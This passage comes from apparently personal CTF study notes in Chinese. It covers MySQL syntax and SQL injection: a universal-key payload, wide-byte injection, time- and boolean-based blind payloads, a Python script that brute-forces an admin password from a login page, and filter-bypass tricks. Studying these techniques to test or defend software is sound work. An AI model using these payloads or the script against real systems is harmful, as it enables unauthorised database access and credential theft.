one&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>__construct~<br>__sleep~<br>__destrcut~<br>O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"psswd";}<br>__wakeup~<br>__destrcut~<br>↑↑↑unserialized with wakeup and destruct<br>__destrcut~<br>bool(false)<br>↑↑↑unserialized, only destruct whithout wakeup above this one<br><br>PHP Notice:  unserialize(): Unexpected end of serialized data on line 27<br>PHP Notice:  unserialize(): Error at offset 68 of 69 bytes on line 27</blockquote><code>mysql</code>与<code>mysqli</code>    # mysql连接：每当第二次使用的时候，都会重新打开一个新的进程；mysqli连接：一直都只使用同一个进程<p><code>mysql_query($query)</code>    # 查询单条语句，不需要查询语句以分号结束</p><p><code>multi_query($query)</code>    # 查询多条语句，语句间以分号分隔，结尾不需要分号，当添加分号发现是以<code>multi_query()</code>查询的时候，可以进行堆叠注入，追加任何mysql查询语句</p><p><code>mysql_fetch_xxx</code>    # 这种类型的函数都是从结果集中取出一行</p><table><thead><tr><th>func</th><th>return</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_array.asp">mysql_fetch_array()</a></td><td>从结果集中取得一行作为关联数组，或数字数组，或二者兼有</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_assoc.asp">mysql_fetch_assoc()</a></td><td>从结果集中取得一行作为关联数组</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_field.asp">mysql_fetch_field()</a></td><td>从结果集中取得列信息并作为对象返回</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_lengths.asp">mysql_fetch_lengths()</a></td><td>取得结果集中每个字段的内容的长度</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_object.asp">mysql_fetch_object()</a></td><td>从结果集中取得一行作为对象</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_row.asp">mysql_fetch_row()</a></td><td>从结果集中取得一行作为数字数组</td></tr></tbody></table><hr><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a><big><center>SQL</center></big></h1><h2 id="MySQL基础命令"><a href="#MySQL基础命令" class="headerlink" title="MySQL基础命令"></a><big>MySQL基础命令</big></h2><ul><li><p>通过命令行输入 mysql -u root -p，然后输入密码即可登录</p><ul><li>若报错，可能是 mysql 服务未启动，也可能是需要管理员权限的 cmd</li></ul></li><li><p>SHOW DATABASES; #查看当前数据库</p></li><li><p>SHOW TABLES; #查看当前数据库中的所有数据表名称</p></li><li><p>DESCRIBE table; #查看数据表结构，如参数名及数据类型</p><ul><li>SHOW COLUMNS FROM table1,table2…; #和上面的DESCRIBE一样，只是这可以同时选择多个表</li></ul></li><li><p>USE database; #进入某一数据库下进行操作</p></li><li><p>CREATE DATABASE database; #新建数据库</p></li><li><p>CREATE TABLE table(row1 type1,row2 type2…); #在进入某一数据库的前提下新建数据表</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Person (Name varchar(25),Address varchar(80),Age int(11)) </span><br></pre></td></tr></table></figure></li><li><p>INSERT INTO table VALUES(value1, value2, …); #向数据表加入数据</p></li><li><p>DELETE FROM table WHERE condition; #删除符合condition的数据</p></li><li><p>ALTER TABLE table DROP column; #删除列</p></li><li><p>UPDATE table SET col.1=value.1 WHERE col.2=value.2; #修改数据，col.1=value.1为赋值语句，col.2=value.2为查找项</p></li><li><p>SELECT：用于查询数据，虽直译为‘选择’，但我认为其与var_dump类似</p><ul><li><p><a href="dev.mysql.com/doc/refman/8.0/en/handler.html">HANDLER</a>：MySQL的专用查询语句，提供通往表的直接通道的存储引擎接口</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLER users OPEN;</span><br><span class="line">HANDLER user READ NEXT;</span><br><span class="line">HANDLER user CLOSE;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>show warnings; #显示错误信息.</p></li><li><p>注释符：“#”与  “– ”(两个减号后面带一个空格)，注意GET方法传参需要先url编码；以及区域注释符/*注释内容*/</p></li></ul><p>注意：当数字型字符或MySQL关键字作为字段、表、库名查询时，应该用反单引号括起来，如 SELECT * FROM &#96;2333&#96; WHERE &#96;from&#96;=&#96;8080&#96;;其中的2333作为表名，from作为字段名，8080作为字段内容 </p><h2 id="MySQL-DICT"><a href="#MySQL-DICT" class="headerlink" title="MySQL DICT"></a><big>MySQL DICT</big></h2><ul><li><p><code>UNION</code>：用于合并两个或多个 SELECT语句的结果集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">select uname,passwd from users</span><br><span class="line">union</span><br><span class="line">select &#39;Union&#39;,233;</span><br><span class="line">        #+----------+-------------+</span><br><span class="line">        #| uname    | passwd      |</span><br><span class="line">        #+----------+-------------+</span><br><span class="line">        #| Kyriota  | kyriotayyds |</span><br><span class="line">        #| 0test    | 0test       |</span><br><span class="line">        #| 233test  | 233test     |</span><br><span class="line">        #| admin    | adpasswd    |</span><br><span class="line">        #| Dr.Who   | Doctor      |</span><br><span class="line">        #| Union    | 233         |</span><br><span class="line">        #+----------+-------------+</span><br></pre></td></tr></table></figure></li><li><p><code>ORDER BY col</code>：以某一列来升序排列，需要降序排列时加上DESC即可，通常通过附加此函数验证数据表有多少列，因为用int表示根据第几个column排序时，超过实际存在的列数会报错</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 2;#此处的2即为passwd列</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| uname   | passwd      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| 0test   | 0test       |</span><br><span class="line">        #| 233test | 233test     |</span><br><span class="line">        #| admin   | adpasswd    |</span><br><span class="line">        #| Dr.Who  | Doctor      |</span><br><span class="line">        #| Kyriota | kyriotayyds |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">mysql&gt; select * from users order by 3;</span><br><span class="line">        #ERROR 1054 (42S22): Unknown column &#39;3&#39; in &#39;order clause&#39;</span><br></pre></td></tr></table></figure></li><li><p><code>CONCAT(col1,col2,col3...)</code>：将多个字符串连接成一个字符串</p></li><li><p><code>CONCAT_WS(sep_str,col1,col,col3...)</code>：可以指定分隔符的连接字符串函数</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#39;-&#39;,uname,passwd) from users;</span><br><span class="line">        #+-----------------------------+</span><br><span class="line">        #| concat_ws(&#39;-&#39;,uname,passwd) |</span><br><span class="line">        #+-----------------------------+</span><br><span class="line">        #| Kyriota-kyriotayyds         |</span><br><span class="line">        #| 0test-0test                 |</span><br><span class="line">        #| 233test-233test             |</span><br><span class="line">        #| admin-adpasswd              |</span><br><span class="line">        #| Dr.Who-Doctor               |</span><br><span class="line">        #+-----------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>GROUP_CONCAT(col SEPARATOR 'sep') FROM table GROUP BY col</code>：指定分隔符与分类方式，当不填写分类方式则全部分为一类，这可以方便爆表</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| uname   | passwd      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| Kyriota | kyriotayyds |</span><br><span class="line">        #| 0test   | 0test       |</span><br><span class="line">        #| 233test | 233test     |</span><br><span class="line">        #| admin   | adpasswd    |</span><br><span class="line">        #| Dr.Who  | Doctor      |</span><br><span class="line">        #| Dr.What | Doctor      |</span><br><span class="line">        #| Dr.How  | Doctor      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">select group_concat(uname separator &#39; , &#39;) from users group by passwd;</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">        #| group_concat(uname separator &#39; , &#39;) |</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">        #| 0test                               |</span><br><span class="line">        #| 233test                             |</span><br><span class="line">        #| admin                               |</span><br><span class="line">        #| Dr.Who , Dr.What , Dr.How           |</span><br><span class="line">        #| Kyriota                             |</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">select group_concat(uname separator &#39;-&#39;) from users;</span><br><span class="line">        #+---------------------------------------------------+</span><br><span class="line">        #| group_concat(uname separator &#39;-&#39;)                 |</span><br><span class="line">        #+---------------------------------------------------+</span><br><span class="line">        #| Kyriota-0test-233test-admin-Dr.Who-Dr.What-Dr.How |</span><br><span class="line">        #+---------------------------------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SELECT DISTINCT</code>：去除重复的数据再返回</p></li><li><p><code>WHERE</code>：</p><ul><li><code><></code>：不等于，如 id&lt;&gt;4</li><li><code>BETWEEN ... AND ...</code>：在某范围内， 如 id BETWEEN 4 AND 8</li><li><code>LIKE</code>：模糊匹配，如 LIKE ‘A%’ 则表示筛选出 A开头的，%可以代替一个或多个字符</li><li><code>IN ( )</code>：只匹配与括号中对应的内容，如 WHERE name IN (‘admin’, ‘guest’)</li><li>NULL：找NULL时不能WHERE col=NULL，应该是WHERE col IS NULL</li></ul></li><li><p><code>AND / OR / NOT</code>：</p><ul><li><code>AND</code>：<code>WHERE Country='China' AND City='BeiJing'</code></li><li><code>OR</code>：<code>WHERE City='ShangHai' OR City='BeiJing'</code></li><li><code>NOT</code>：<code>WHERE NOT Country='China'</code></li></ul></li><li><p><code>CASE WHEN condition THEN statement ... END</code>：和大多数的case语句一样，但注意它相对于IF() ※ 不需要逗号与括号 ※</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select *,case when mark &gt;&#x3D;90 then &#39;A&#39; when mark &gt;&#x3D;60 then &#39;B&#39; else &#39;C&#39; end as level from grades order by mark desc;</span><br><span class="line">        #+------+------+-------+</span><br><span class="line">        #| Name | mark | level |</span><br><span class="line">        #+------+------+-------+</span><br><span class="line">        #| Tom  |   95 | A     |</span><br><span class="line">        #| Jill |   92 | A     |</span><br><span class="line">        #| Alan |   76 | B     |</span><br><span class="line">        #| Neo  |   59 | C     |</span><br><span class="line">        #+------+------+-------+</span><br></pre></td></tr></table></figure></li><li><p><code>IF(exp1,exp2,exp3)</code>：若exp1，则exp2，否则exp3</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select *,if(mark&gt;&#x3D;60, &#39;PASS&#39;, &#39;NOPE&#39;) from grades;</span><br><span class="line">        #+------+------+------------------------------+</span><br><span class="line">        #| Name | mark | if(mark&gt;&#x3D;60, &#39;PASS&#39;, &#39;NOPE&#39;) |</span><br><span class="line">        #+------+------+------------------------------+</span><br><span class="line">        #| Tom  |   95 | PASS                         |</span><br><span class="line">        #| Jill |   92 | PASS                         |</span><br><span class="line">        #| Neo  |   59 | NOPE                         |</span><br><span class="line">        #| Alan |   76 | PASS                         |</span><br><span class="line">        #+------+------+------------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SUBSTR / MID(str,start,length)</code>：start为起点；length为截取长度，length可选择不填</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select substr(passwd,1,3) from users;</span><br><span class="line">        #+--------------------+</span><br><span class="line">        #| substr(passwd,1,3) |</span><br><span class="line">        #+--------------------+</span><br><span class="line">        #| kyr                |</span><br><span class="line">        #| 0te                |</span><br><span class="line">        #| 233                |</span><br><span class="line">        #| adp                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #+--------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SUBSTR / MID((col)from(start))</code>：这种表达很关键的一点在于 ※ 不需要逗号 ※</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select mid((passwd)from(3)) from users;</span><br><span class="line">#+----------------------+</span><br><span class="line">#| mid((passwd)from(3)) |</span><br><span class="line">#+----------------------+</span><br><span class="line">#| riotayyds            |</span><br><span class="line">#| est                  |</span><br><span class="line">#| 3test                |</span><br><span class="line">#| passwd               |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#+----------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>MD5()</code>：SQL也内置了 md5加密函数</p></li><li><p><code>SLEEP()</code>：延迟函数，单位为秒</p></li></ul><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><big>information_schema</big></h2><p>信息数据库，保存着关于mysql服务器所维护的所有其他数据库的信息，该数据库中又有几个重要的数据表，而当需要跨数据库访问时，则与类成员的访问相似，如对于COLUMNS：information_schema.COLUMNS</p><ul><li><p>SCHEMATA：提供了当前mysql实例中所有数据库的信息</p><ul><li>SCHEMA_NAME这一列记录着所有数据库名</li></ul></li><li><p>TABLES：提供了当前数据库中的表的信息，表类型，表引擎，所属的数据库，创建时间等信息</p><ul><li>TABLE_NAME：数据表名</li><li>TABLE_SCHEMA：表对应的数据库名</li></ul></li><li><p>COLUMNS：提供了表中列的信息，详细表述所有列的信息</p><ul><li><p>TABLE_SCHEMA：数据库名</p></li><li><p>TABLE_NAME：表名</p></li><li><p>COLUMN_NAME：列名</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select * from columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">        #| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME | COLUMN_NAME         | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME     | COLUMN_TYPE | COLUMN_KEY | EXTRA | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION | SRS_ID |</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">        #| def           | performance_schema | users      | CURRENT_CONNECTIONS |                2 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL               | bigint      |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | performance_schema | users      | TOTAL_CONNECTIONS   |                3 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL               | bigint      |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | performance_schema | users      | USER                |                1 | NULL           | YES         | char      |                       32 |                    128 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_bin        | char(32)    | UNI        |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | test               | users      | passwd              |                2 | NULL           | YES         | varchar   |                       12 |                     48 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_0900_ai_ci | varchar(12) |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | test               | users      | uname               |                1 | NULL           | YES         | varchar   |                       10 |                     40 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_0900_ai_ci | varchar(10) |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="基于约束的攻击"><a href="#基于约束的攻击" class="headerlink" title="基于约束的攻击"></a><big>基于约束的攻击</big></h2><blockquote>在MySQL的配置选项中，有一个sql_mode选项。当MySQL的sql_mode设置为default时，即没有开启STRICT_ALL_TABLES选项时，MySQL对于用户插入的超长值只会提示warning，而不是error（如果是error则插入不成功），这可能会导致发生一些“截断”问题 ———— 道哥</blockquote><p>因为在sql执行字符串处理时，字符串末尾的空格符将会被删除，导致 “admin”与 “admin     ”是等效的。当使用如 “admin                       x”这样的超长字符串，或末尾直接是空格的“admin   ”注册成功，前者会因为截断，和后者一样可以达到越权获取权限</p><h2 id="SQL查询与比较"><a href="#SQL查询与比较" class="headerlink" title="SQL查询与比较"></a><big>SQL查询与比较</big></h2><p>str与int的比较：与PHP一样，非数字开头的str被当成 0，数字开头的会被当成那个开头的数字，这使得在输入 user=0或 user=’’时返回所有非 0开头的 user</p><p>SQL连等：阴间语法，如 where user=’admin’=’admin’=1，可理解为做异或取反 (同或)运算</p><blockquote>查第一个admin，查询对象是原本的数据表，结果为{admin：1，其他：0}    此时还没有到返回admin并打印出来的时候，因为后面的连等还没有比较完</blockquote><blockquote>查第二个admin，查询对象是1和0，因为admin非数字开头，此时和int比较，转换成0，和上次非admin的字段的查询结果匹配，所以这次比较结果为{admin：0，其他：1}</blockquote><blockquote>第三次查1，显然匹配到其他，故最终返回为处admin外的所有成员</blockquote><h2 id="万-能-钥-匙"><a href="#万-能-钥-匙" class="headerlink" title="万 能 钥 匙"></a><big>万 能 钥 匙</big></h2><p>最基础的SQL注入：admin’ or ‘1’=’1</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a><big>宽字节注入</big></h2><p align='right'><small>特征：gbk等宽字节编码</small></p><p>通常的在sql语句前面使用了一个addslashes()，将$id的值转义。这是通常对sql注入进行的操作，只要我们的输入参数在单引号中，就逃逸不出单引号的限制，无法注入</p><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前提是前一个ASCII码大于128，这样才能达到汉字的范围，如%df之类的）</p><p>示例payload：<code>/?id=hello%df' union select 'admin','pass'#</code></p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><big>盲注</big></h2><p align='right'><small>SQLI-LAB</small></p><p>对无回显页面的注入叫做盲注，大多数时候都是遇见的这样的页面，分为布尔盲注和时间盲注，但本质上差别不大。原理大致可理解为不断猜测字符的过程，通过注入后返回的信息判断猜对与否，有点暴力破解的意思。由于盲注的重复性，手注在盲注中最多用于盲注类型的判断，猜测过程则交给脚本，burp，sqlmap等完成</p><p>通常盲注时先跑数据库名的长度，再跑数据库名，然后又跑表名的长度…如果有需要甚至可爆整个数据库，也可以不跑长度而直接开始跑内容，因为知道长度的作用只是心里有个底。布尔盲注和时间盲注的区别就只是在于返回信息不同，布尔盲注通过返回两种状态信息判断，时间盲注则根据响应时间判断</p><ul><li><p>payload构造与示例</p><p>构造payload时，应根据网页实现的功能考虑使用了什么SQL查询语句，这样才能准确知道需要多少括号或引号来闭合语句</p><ul><li><p>表长（包含在INSERT INTO … VALUE(input)中）：<code>'and (case when (length((select group_concat(table_name separator '-') from information_schema.tables where table_schema=database()))=10) then sleep(5) else 1 end)) #</code></p><p>  可以发现结尾因为要注释掉多余的 <code>')</code> 而补了一个反括号</p></li><li><p>表名：<code>if(substr((select group_concat(table_name separator ',') from information_schema.tables where table_schema=database())  from %s for 1)='%s',sleep(5),1)</code></p></li><li><p>字段名：<code>ascii(mid((select group_concat(column_name separator '-') from information_schema.columns where table_name='表名') from(%i)))=%i</code></p></li></ul></li><li><p>e.g.布尔盲注猜admin密码</p><ul><li><p>如返回“用户名不存在”与“密码错误”两种信息的页面，就可以尝试布尔盲注</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://114.67.246.176:13058/login.php&#x27;</span><span class="comment">#注意是登录页而非index</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):<span class="comment">#猜测是MD5加密，为32位，先跑33位试试</span></span><br><span class="line">    <span class="keyword">for</span> tar <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#32~128为常用的96个ASCII字符</span></span><br><span class="line">        uname=<span class="string">&quot;admin&#x27;=&#x27;admin&#x27;=ascii(mid((passwd)from(%s)))-%s-&#x27;&quot;</span>%(i,tar)</span><br><span class="line">        data=&#123;<span class="string">&#x27;uname&#x27;</span>:uname,<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;anything&#x27;</span>&#125;</span><br><span class="line">        response=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> response:<span class="comment">#报密码错误时说明tar的值与密码第i位字符的ASCII相同</span></span><br><span class="line">            result+=<span class="built_in">chr</span>(tar)</span><br><span class="line">            print(<span class="string">&quot;\r%s&quot;</span>%result,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>上述脚本不是绝对的，有的登录页可能对某些注入方式设置了针对性过滤，具体的payload构造还需要对应具体情况，此处再举一个“=”被过滤的例子</p>  <center><code>"admin'^((ascii(mid((select(password)from(admin))from(%s))))<>%s)^1#"</code></center></li></ul></li></ul><h2 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a><big>预处理语句</big></h2><p>所谓预处理指的就是将SQL语句中的关键字(如 SELECT…FROM…)与数据(如字段名，数据表名)分离,使得针对不同数据的相同SQL语句的执行开销更小，同时又可防止SQL注入的攻击</p><p>传统方式的SQL语句，在执行时每条SQL都需要经过分析、编译和优化的步骤；预处理方式则是利用客户端与服务器的二进制协议，预先编译一次客户端发送的SQL语句模板,然后再根据客户端发送给服务器相应数量的变量进行执行操作，并旦针对一条SQL语句模板可以执行多次,还无需考虑数据中含有未转义的SQI引号和分隔符字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt FROM &#39;SELECT * FROM user WHERE uname&#x3D;?&#39;;</span><br><span class="line">SET @uname&#x3D;&#39;admin&#39;;</span><br><span class="line">EXECUTE stmt USING @uname;</span><br><span class="line">DEALLOCATE &#x2F; DROP PREPARE stmt;</span><br></pre></td></tr></table></figure><p>以此，可以在能堆叠注入时候绕过对SELECT等关键字的过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET @sqlvar&#x3D;CONCAT(&#39;SE&#39;,&#39;LECT * FROM user&#39;);</span><br><span class="line">PREPARE myquery FROM @sqlvar;</span><br><span class="line">EXECUTE myquery;</span><br></pre></td></tr></table></figure><h2 id="❀花式绕过❀"><a href="#❀花式绕过❀" class="headerlink" title="❀花式绕过❀"></a><big>❀花式绕过❀</big></h2><ul><li><p>双写关键字：某些简单的waf中，将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经waf的处理之后又变成<code>select</code>，达到绕过的要求</p></li><li><p>过滤select：当存在回显时，可以基于报错注入。常用函数为两个操作XML文档的函数</p><ul><li><code>extractvalue()</code>：对XML文档进行查询的函数<ul><li>para：(目标xml文档，xml路径)</li></ul></li><li><code>updatexml()</code>：更新xml文档<ul><li>para：(目标xml文档，xml路径，更新的内容)</li></ul></li></ul><p>  通过将正常的XML路径修改为不符合语法的路径即可使其报错并显示错误内容，如下面这则查询：</p><p>  <code>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</code></p><p>  会返回：<code>error 1105 : XPATH syntax error: &#39;~database_name&#39;</code>，即 <code>~</code> 与库名组成的字段</p></li><li><p>过滤引号：转hex，如admin =&gt; hex{61 64 6d 69 6e}</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from users where uname &#x3D; 0x61646d696e;</span><br><span class="line">        #+-------+----------+</span><br><span class="line">        #| uname | passwd   |</span><br><span class="line">        #+-------+----------+</span><br><span class="line">        #| admin | adpasswd |</span><br><span class="line">        #+-------+----------+</span><br></pre></td></tr></table></figure></li><li><p>过滤空格：<code>/**/</code>，<code>()</code>，<code>%0a</code>，<code>`</code></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users;</span><br><span class="line">select(id)from(users);#注意*不能在空格内</span><br><span class="line">select&#96;id&#96;from&#96;users&#96;where&#96;id&#96;&#x3D;1;</span><br></pre></td></tr></table></figure></li><li><p>过滤逻辑运算符：<code>and = &amp;&amp;</code>，<code>or = ||</code>，<code>xor = |</code>，<code>not = !</code></p></li><li><p>过滤等号：</p><ul><li><p><code>like</code>：不加通配符%的like与等于等效</p>  <center><code>select * from users where uname like 'admin';</code></center></li><li><p><code>rlike</code>：模糊匹配，搜索字段中存在的部分，则所有包含搜索内容的字段均会被选中</p>  <center><code>select * from users where uname rlike 'admin';</code></center></li><li><p><code>regexp</code>：正则匹配</p>  <center><code>select * from users where uname regexp 'admin';</code></center></li><li><p>夹逼：</p>  <center><code>select * from users where id>0 and id<2;</code></center></li><li><p><code>!(...&lt;&gt;...)</code>：双重否定表肯定</p>  <center><code>select * from users where !(uname<>'admin');</code></center></li><li><p>strcmp(str1,str2)：字符串相同返回0，不同返回1或-1</p></li></ul>  <center><code>strcmp(ascii(substr(uname,1,1)),100)</code></center><ul><li>in：</li></ul>  <center><code>substr(username,1,1) in ('a')</code></center><ul><li>between … and …：</li></ul>  <center><code>substr(username,1,1) between 'a' and 'a'</code></center></li><li><p>过滤逗号：</p><ul><li><p>对于substr()，mid()等字符处理函数可用<code>from pos for len</code>：从<code>pos</code>开始读<code>len</code>个字符，用法为<code>substr(&#39;HelloWorld&#39; from 2 for 5)</code></p></li><li><p>对于需要<code>union select</code>到的派生表，可以用<code>join</code>代替逗号来隔开；注意派生表需要对其定义一个临时表名</p>  <center><code>select 1，2，3;</code></center>  <center>等价于</center>  <center><code>select * from (select 1)a join (select 2)b join(select 3)c;</code></center></li></ul></li><li><p>过滤部分函数：</p><ul><li><p>sleep() 